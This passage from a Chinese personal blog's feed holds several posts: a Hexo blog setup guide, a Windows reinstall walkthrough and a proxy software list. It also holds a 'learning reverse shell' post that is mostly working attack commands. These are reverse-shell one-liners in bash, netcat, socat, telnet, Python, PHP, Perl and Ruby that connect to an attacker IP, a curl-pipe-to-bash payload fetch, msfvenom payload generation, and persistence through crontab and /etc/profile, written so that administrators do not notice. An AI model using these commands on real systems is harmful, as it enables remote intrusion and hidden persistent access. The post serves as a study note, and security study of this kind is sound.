class="punctuation">:</span> <span class="string">&quot;https://你的Bucket域名&quot;</span><span class="punctuation">,</span> <span class="comment">//需要手动添加https://</span></span><br><span class="line">          <span class="comment">//以上信息在Bucket概览中</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">//留空，记得删除所有注释</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>完成设置后可以验证图片上传选项，如果没有遇到报错则所有图片均会由Typora上传到阿里云OSS，hexo博客中可以正常渲染。</p>
<h5 id="3-若无法正常渲染，考虑是否安装hexo主题的渲染插件">3.若无法正常渲染，考虑是否安装hexo主题的渲染插件</h5>
<p>例如butterfly主题依赖pug 以及 stylus 的渲染器，则可在Git窗口中运行以下命令：</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
<h4 id="六、域名解析">六、域名解析</h4>
<p>若是放在GitHub Pages上的网页可以使用CNAME记录进行域名解析，若是放在云服务器上可以使用A记录进行解析，此处仅做CNAME记录的教程。</p>
<p>在完成域名实名以后可以进入DNS云解析界面，如图设置一条@记录一条www记录</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-08-25_11-15-36.png"
                        alt="Clip_2024-08-25_11-15-36"
                 ></p>
<p>随后在博客的source文件夹内新建一个<code>CNAME</code>文件（没有后缀名）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-08-25_11-16-37.png"
                        alt="Clip_2024-08-25_11-16-37"
                 ></p>
<p>使用记事本打开后输入域名，例如<code>c3ngh.top</code>，保存后退出，重新进行hexo三连即可推送并进行域名解析。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Clip_2024-08-25_11-18-09.png"
                        alt="Clip_2024-08-25_11-18-09"
                 ></p>
<h4 id="七、本地搜索">七、本地搜索</h4>
<ul>
<li>
<p>安装依赖</p>
<p>在博客根目录大概Git Bash后执行</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>写入配置</p>
<p>在站点配置文件中添加如下代码：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li><code>path</code> - 文件路径：可以生成 xml 和 json 两种格式，默认情况下是 <code>search.xml</code> 。如果文件扩展名为 <code>.json</code> ，则输出格式将为JSON。否则，将导出 XML格式化文件。</li>
<li><code>field</code> - 搜索范围：
<ul>
<li><code>post</code>（默认）- 涵盖所有文章</li>
<li><code>page</code> - 涵盖所有页面</li>
<li><code>all</code> - 涵盖所有文章和页面</li>
</ul>
</li>
<li><code>content</code> - 是否包含每篇文章的全部内容，<code>false</code>生成的结果仅包含标题和创建时间等信息，没有文章内容，默认为<code>true</code></li>
<li><code>fotmat</code> - 搜索到的内容和选项的格式
<ul>
<li><code>html</code>（默认） - 将html原文本缩略</li>
<li><code>strptags</code> - 将html原文本缩略，并删除所有标记</li>
<li><code>raw</code> - 记录下每一篇文章和页面的文字</li>
</ul>
</li>
</ul>
</li>
<li>
<p>开启搜索</p>
<p>在主题配置文件中修改以下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line"><span class="bullet">-</span>  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="string">+</span>  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="八、评论系统">八、评论系统</h4>
<p>waline的官方教程写的非常详细，可以直接参考<a class="link"   href="https://waline.js.org/guide/get-started" >快速上手 | Waline<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="九、报错解决">九、报错解决</h4>
<p>1.推送报错问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error: Spawn failed</span><br><span class="line">Failed to connect to github.com port 443 after 23565 ms: Couldn’t connect to server</span><br></pre></td></tr></table></figure>
<p>可能是本机代理存在问题导致服务器连接不上，我使用的是Clash，端口7891，则在git窗口中输入</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:7891</span><br><span class="line">git config --global https.proxy https://127.0.0.1:7891</span><br></pre></td></tr></table></figure>
<p>两条命令会设置git的http和https的代理为本机的7891端口，然后可以进行正常的hexo三连</p>
<p>也可以在Clash中<strong>开启TUN模式</strong>（推荐）</p>
<p>注意：Clash默认端口为7890，会与宽带拨号上网端口冲突，为了在PPPoE情况下使用代理，可以将Clash端口修改为其他数值，此时git命令后的数值也要随之变换。</p>
<p><strong>取消代理</strong></p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>
<p>其他报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fatal: The remote end hung up unexpectedly</span><br></pre></td></tr></table></figure>
<p>造成此报错的原因是推送的文件太大，在排除掉网络和代理问题后，就是缓存不够</p>
<p>我们可以在克隆/创建版本库生成的 .git目录下面修改生成的config文件</p>
<p>hexo博客该目录所在位置为： /.deploy_git/.git/config</p>
<p>记事本打开后在文件末尾新增：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[http]  </span><br><span class="line">postBuffer = 524288000</span><br></pre></td></tr></table></figure>
<p>该操作会使缓存大小设置为500MB。</p>
<h5 id="2-npm报错问题">2.npm报错问题</h5>
<p>如果在执行以下步骤时遇到报错</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<p>可能是因为此前换成旧淘宝源（已停用），所以要重新修改为官方源。</p>
<p>如果遇到npm速度过慢，可以尝试更换为国内源。</p>
<figure class="highlight plaintext"><figcaption><span>Bash</span></figcaption><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmjs.org/</span><br><span class="line">//官方源</span><br><span class="line">npm config set registry https://registry.npmmirror.com</span><br><span class="line">//淘宝最新源</span><br><span class="line">npm config set registry https://registry.npm.taobao.org</span><br><span class="line">//淘宝旧源</span><br><span class="line">npm config set registry https://npm.aliyun.com</span><br><span class="line">//阿里云</span><br><span class="line">npm config set registry https://mirrors.huaweicloud.com/repository/npm/</span><br><span class="line">//华为云</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>学习反弹shell</title>
    <url>//post/ReverseShell/</url>
    <content><![CDATA[<h3 id="什么是反弹shell">什么是反弹shell</h3>
<p>反弹 shell 是指<strong>目标主机主动向攻击者的主机发起连接</strong>，然后攻击者利用这个连接与目标主机进行交互。与之相对的是<strong>绑定 shell</strong>，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。</p>
<h3 id="反弹shell的工作原理">反弹shell的工作原理</h3>
<p><strong>攻击者监听</strong>：攻击者在自己的机器上打开一个监听端口，等待目标主机连接。</p>
<p><strong>目标主机发起连接</strong>：通过漏洞利用或命令注入，攻击者让目标主机执行一条指令，这条指令会主动连接攻击者的 IP 和端口。</p>
<p><strong>建立通信通道</strong>：连接成功后，目标主机将自己的命令行输入输出通过这个通道传递给攻击者。</p>
<p><strong>攻击者执行命令</strong>：攻击者通过这个通道直接操作目标主机。</p>
<p>简单点说：A攻击B，A监听自己的某个端口，B主动访问A的那个端口，在A上对B进行命令执行，谁攻击谁监听自己，谁被攻击谁主动访问</p>
<h3 id="为什么要反弹shell">为什么要反弹shell</h3>
<ol>
<li>目标主机位于内网（NAT 环境）或防火墙后面，攻击者无法直接访问目标主机的开放端口</li>
<li>目标主机有防火墙限制入站流量，反弹 shell 利用目标主机主动发起出站连接，而防火墙通常不会限制出站流量</li>
<li>目标主机没有固定 IP， 如果目标主机使用动态分配的 IP 地址（例如内网 DHCP 分配），攻击者很难找到目标主机的 IP</li>
<li>规避入侵检测系统（IDS）</li>
<li>限制攻击者暴露自身位置</li>
</ol>
<h3 id="利用netcat反弹shell">利用netcat反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netcat -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netcat 120.xxx.xxx.xxx 11451 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure>
<h3 id="利用bash反弹shell">利用bash反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/120.xxx.xxx.xxx/11451 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Curl配合Bash反弹shell">Curl配合Bash反弹shell</h3>
<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>并开启11451端口的监听。</p>
<p>然后再目标机上执行如下，即可反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 120.xxx.xxx.xxx|bash</span><br></pre></td></tr></table></figure>
<h3 id="将反弹shell的命令写入定时任务">将反弹shell的命令写入定时任务</h3>
<p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)</p>
<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/120.xxx.xxx.xxx/11451 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment">#每隔一分钟，向120.xxx.xxx.xxx的11451号端口发送shell</span></span><br></pre></td></tr></table></figure>
<h3 id="将反弹shell的命令写入-etc-profile文件">将反弹shell的命令写入/etc/profile文件</h3>
<p>将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/120.xxx.xxx.xxx/11451 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure>
<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p>
<h3 id="利用Socat反弹shell">利用Socat反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:11451 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat tcp-connect:120.xxx.xxx.xxx:11451 <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>
<h3 id="利用Telnet反弹shell">利用Telnet反弹shell</h3>
<h4 id="方法一">方法一</h4>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mknod</span> a p; telnet 120.xxx.xxx.xxx 11451 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p><strong>攻击机需要开启两个本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br><span class="line">nc -lvvp 19198</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 120.xxx.xxx.xxx 11451 | /bin/bash | telnet 120.xxx.xxx.xxx 19198</span><br></pre></td></tr></table></figure>
<h3 id="Python-脚本反弹shell">Python 脚本反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.xxx.xxx.xxx&quot;,11451));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-脚本反弹shell">PHP 脚本反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;120.xxx.xxx.xxx&quot;,11451);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Perl-脚本反弹shell">Perl 脚本反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;120.xxx.xxx.xxx&quot;;$p=11451;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Ruby-脚本反弹shell">Ruby 脚本反弹shell</h3>
<p><strong>攻击机开启本地监听：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 11451</span><br></pre></td></tr></table></figure>
<p><strong>目标机主动连接攻击机：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;120.xxx.xxx.xxx&quot;,&quot;11451&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;120.xxx.xxx.xxx&quot;,&quot;11451&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="使用Metasploit生成反弹shell">使用Metasploit生成反弹shell</h3>
<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep <span class="string">&#x27;cmd/unix/reverse&#x27;</span></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=120.xxx.xxx.xxx LPORT=11451 -f raw</span><br></pre></td></tr></table></figure>
<h3 id="反弹shell后获取模拟终端">反弹shell后获取模拟终端</h3>
<p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="写在最后">写在最后</h3>
<p>在尝试的时候用自己的服务器给自己的电脑弹了个shell然后删掉了桌面上的文件，把我以为在D盘有备份的数据库实验报告删了，快进到熬夜重写。红温红温红温红温。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250508122554187.png"
                        alt="image-20250508122554187"
                 ></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>如何优雅的重装系统</title>
    <url>//post/SystemReinstall/</url>
    <content><![CDATA[<h3 id="一、事先准备">一、事先准备</h3>
<ul>
<li>一个大于8G的空U盘</li>
<li>Windows系统镜像及驱动</li>
<li>一颗敢于折腾的心</li>
<li><s>一台电脑</s></li>
</ul>
<h3 id="二、下载系统镜像及驱动">二、下载系统镜像及驱动</h3>
<h4 id="系统镜像下载">系统镜像下载</h4>
<p>点击链接跳转至 <a class="link"   href="https://next.itellyou.cn/" >MSDN，我告诉你<i class="fas fa-external-link-alt"></i></a> 下载微软官方原版镜像</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018010144723.png"
                        alt="image-20241018010144723"
                 ></p>
<p>选择复制ED2K，并使用迅雷下载，如果不想电脑被迅雷占领，则可以使用磁力链接下载</p>
<blockquote>
<p>注意：</p>
<p>优先选择专业版，而不是家庭版</p>
<p>优先选择consumer editions，而不是中文定制版，consumer editions也可以使用英文</p>
<p>万万不可选Windows 11 24H2版本，直至本文发布时，24H2依然有一大堆bug，推荐使用23H2</p>
</blockquote>
<p>原版镜像一定是以<code>.iso</code>为文件后缀名的，而不是<code>.gho</code>，注意甄别</p>
<h4 id="驱动下载">驱动下载</h4>
<p>进入各大品牌官网下载驱动，例如：<a class="link"   href="https://newsupport.lenovo.com.cn/driveDownloads_index.html" >联想官网驱动下载-联想官网 (lenovo.com.cn)<i class="fas fa-external-link-alt"></i></a>，或者直接选择使用360驱动大师一类产品，如果是联想电脑，在出厂时D盘下有一个<code>Drivers</code>目录，里面存放的就是驱动，直接将那个文件夹复制一份到U盘内即可</p>
<h3 id="三、制作WinPE">三、制作WinPE</h3>
<p>点击链接 <a class="link"   href="https://www.wepe.com.cn/" >微PE工具箱 - 超好用的装机维护工具 (wepe.com.cn)<i class="fas fa-external-link-alt"></i></a> 下载微PE</p>
<p>将事先准备好的U盘插入电脑，然后找到并打开下载好的微PE工具箱，选择左下角安装PE到U盘</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018010815350.png"
                        alt="image-20241018010815350"
                 ></p>
<p>完成制作后将下载好的镜像拷贝至U盘，镜像文件名应该类似下图</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018011035529.png"
                        alt="image-20241018011035529"
                 ></p>
<h3 id="四、高级启动">四、高级启动</h3>
<p>在设置 - 系统 - 恢复 中，选择高级启动，点击立即重新启动</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018011146300.png"
                        alt="image-20241018011146300"
                 ></p>
<p>重启后会自动进入高级启动界面，通常如下图所示</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018011330451.png"
                        alt="image-20241018011330451"
                 ></p>
<p>在疑难解答中选择高级选项</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018011417501.png"
                        alt="image-20241018011417501"
                 ></p>
<p>在高级选项中选择UEFI固件设置，然后敲回车键重启，重启后会自动进入BIOS</p>
<p>也可以在关机状态下，按下开机键后连续按<code>F2</code>进入BIOS（各个品牌按键有所不同，大多集中在<code>F2、F12、DEL</code>键等，具体情况百度），<strong>注意不是按住不松手，是尽可能快的连续多次按下，直至进入BIOS</strong>。</p>
<h3 id="五、BIOS设置">五、BIOS设置</h3>
<p>本文以联想拯救者的BIOS为例</p>
<p>进入BIOS前插入U盘，则此处会多显示一个USB设备，选择箭头将USB设备的启动顺序移动到第一个，点击右上角的保存并退出即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018012808710.png"
                        alt="image-20241018012808710"
                 ></p>
<p>如果是第一次重装，系统默认会开启“安全启动”选项，则需要进入高级设置 / 详细设置中，找到安全启动并关闭</p>
<p>注：只有某些特定版本不在Windows引导程序白名单中的PE需要关闭安全启动，目前大多数PE就算不关闭安全启动也可以被正常识别，参考文章：<a class="link"   href="https://mp.weixin.qq.com/s/yaAikTpIe9ALh-volcxirg%EF%BC%88%E6%84%9F%E8%B0%A2LilRan%E5%B8%88%E5%82%85%E7%9A%84%E6%8C%87%E6%AD%A3%EF%BC%89" >https://mp.weixin.qq.com/s/yaAikTpIe9ALh-volcxirg（感谢LilRan师傅的指正）<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018012833813.png"
                        alt="image-20241018012833813"
                 ></p>
<p>也可以在详细设置中修改启动顺序</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018012859515.png"
                        alt="image-20241018012859515"
                 ></p>
<p>最后按F10保存并退出即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018012924104.png"
                        alt="image-20241018012924104"
                 ></p>
<h3 id="六、对硬盘重新分区">六、对硬盘重新分区</h3>
<p>进入PE后，打开名如<code>diskgenius</code>，<code>磁盘精灵</code>，<code>磁盘工具</code>一类的橙色软件，双击进入后应如图显示</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018013134867.png"
                        alt="image-20241018013134867"
                 ></p>
<p>在左侧选中你电脑的硬盘，然后右键选择删除所有分区</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018013208816.png"
                        alt="image-20241018013208816"
                 ></p>
<p>然后按左上角的保存更改，此时磁盘数据已被清空，然后选择工具栏中的快速分区选项</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018013343232.png"
                        alt="image-20241018013343232"
                 ></p>
<p>一般来说旧电脑是BIOS+MBR启动，新电脑是UEFI+GPT启动，目前接触到的大多数都是后者，所以保持原有选项即可，可以自定义分区数量和大小，这会决定电脑有几个盘，也会决定每个盘的大小，推荐仅保留一个分区（C盘）即可，可以把软件全装C盘也不会满，而且固态硬盘的最理想状态是一条硬盘一个分区。</p>
<h3 id="七、使用WinNTSetup安装系统">七、使用WinNTSetup安装系统</h3>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018014326191.png"
                        alt="image-20241018014326191"
                 ></p>
<p>按步骤完成后一路点击安装即可，等待完成安装后会跳出弹窗，选择关闭弹窗</p>
<h3 id="八、注入驱动">八、注入驱动</h3>
<p>打开PE内的dism++，双击运行，选中刚才安装的系统，单击后选择软件中间的“打开会话”选项</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018014624577.png"
                        alt="image-20241018014624577"
                 ></p>
<p>选择左边菜单栏内的驱动管理，选择驱动文件所在的文件夹，可以一键注入所有驱动</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241018014726100.png"
                        alt=" "
                 ></p>
<blockquote>
<p>注意：</p>
<p>12代以上Intel处理器在安装完成后可能会蓝屏，如果是用镜像刻录安装可能会找不到硬盘，两者原理相通，都是12代以上Intel支持了RAID技术，所以需要额外注入一个RST驱动才可以正常进入系统，或者在BIOS内禁用RAID</p>
</blockquote>
<p>RST驱动下载地址：<a class="link"   href="https://dlcdnets.asus.com/pub/ASUS/GamingNB/FX507ZE/RST_V19.1.0.1001_PV.zip" >RST补丁<i class="fas fa-external-link-alt"></i></a></p>
<p>解压后同样选择文件夹然后导入驱动，完成后在PE内关机，完全关机后拔掉U盘</p>
<p>如果遇到驱动注入失败，可能是驱动格式不被dism++支持，可以跳过这个步骤，等待开机后再安装驱动</p>
<h3 id="九、OOBE阶段注意事项">九、OOBE阶段注意事项</h3>
<h4 id="联网步骤">联网步骤</h4>
<p>开机，然后耐心的等待，会自动进入Windows首次设置的流程，也称OOBE，根据需求一路“下一步”后会来到一个要求联网的界面，如果上一步驱动注入正确，此处应该可以正确识别W-iFi，如果驱动注入未成功，则无法正确显示Wi-Fi，解决方法有三：</p>
<ol>
<li>连接网线：如果电脑有RJ45网口的话，直接连接网线即可，如果没有的话可用扩展坞或USB转接</li>
<li>使用数据线连接手机，在手机弹出的窗口中选择<code>USB网络共享</code>（安卓），然后电脑就会识别到手机共享的网络，但注意：该方法可能需要多次拔插数据线并重复联网步骤，大概需要3-4次</li>
<li>跳过联网：按住<code>shift + F10</code>键，在弹出的命令行窗口中输入<code>OOBE\BYPASSNRO</code>（大小写不敏感）后按下回车，系统会自动重启，再进行一次OOBE，来到联网步骤会发现新增选项：<code>我没有Internet连接</code>，选择该选项即可跳过联网</li>
</ol>
<h4 id="输入用户名">输入用户名</h4>
<p>如果在网络连接步骤中选择连接网络并在接下来的步骤登录Microsoft账号，系统用户名则会被自动命名为登录邮箱的前五位，如果选择跳过连接或选择本地帐号登录，则需要自行命名系统用户名，注意：一定要使用英文或数字，<strong>千万不可使用中文，后续会出现很多环境问题报错</strong></p>
<h3 id="十、优雅的进入系统">十、优雅的进入系统</h3>
<p>完成上述所有步骤后即可正确进入系统，<s>快进到蓝屏重装</s></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>科学上网指北</title>
    <url>//post/VPNuse/</url>
    <content><![CDATA[<h1>仅供学术讨论使用 造成任何后果自负</h1>
<h3 id="代理软件">代理软件</h3>
<h4 id="Clash-Verge">Clash Verge</h4>
<p>GitHub Releases地址：<a class="link"   href="https://github.com/clash-verge-rev/clash-verge-rev/releases" >Releases · clash-verge-rev/clash-verge-rev<i class="fas fa-external-link-alt"></i></a></p>
<p>适用于Windows、MacOS、Linux</p>
<h4 id="Clash-Meta-For-Android">Clash Meta For Android</h4>
<p>GitHub Releases地址：<a class="link"   href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases" >Releases · MetaCubeX/ClashMetaForAndroid<i class="fas fa-external-link-alt"></i></a></p>
<p>适用于Android</p>
<h4 id="Surfboard">Surfboard</h4>
<p><a class="link"   href="https://github.com/getsurfboard/surfboard/releases" >Releases · getsurfboard/surfboard<i class="fas fa-external-link-alt"></i></a></p>
<p>适用于Android</p>
<h4 id="Shadowrocket">Shadowrocket</h4>
<p><a class="link"   href="https://apps.apple.com/us/app/shadowrocket/id932747118" >‎Shadowrocket on the App Store<i class="fas fa-external-link-alt"></i></a> （售价2.99美元不含税）</p>
<p>注：iOS需美区ID，此处仅提供App Store链接</p>
<h3 id="机场购买">机场购买</h3>
